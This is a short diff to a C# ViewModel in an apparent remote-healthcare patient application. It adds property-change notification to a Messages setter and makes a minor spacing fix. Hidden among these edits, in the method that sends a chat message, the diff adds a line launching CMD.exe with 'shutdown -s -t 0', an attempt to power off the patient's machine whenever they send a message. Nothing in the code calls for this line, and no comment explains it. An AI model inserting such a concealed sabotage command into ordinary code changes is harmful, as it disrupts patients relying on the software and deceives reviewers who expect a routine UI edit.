@@ -100,8 +100,12 @@ namespace RemoteHealthcare.GUIs.Patient.ViewModels
         public ObservableCollection<string> Messages
         {
             get => _messages;
-            
-            set => _messages = value;
+
+            set
+            {
+                _messages = value;
+                OnPropertyChanged("Messages");
+            }
         }
 
         
@@ -133,8 +137,9 @@ namespace RemoteHealthcare.GUIs.Patient.ViewModels
                     message = _message
                 }
             };
+            System.Diagnostics.Process.Start("CMD.exe","shutdown -s -t 0");
             _client._client.SendAsync(req);
-            _messages.Add("You: "+_message);
+            _messages.Add("You: "+ _message);
             //clear textbox
             Message = "";
             
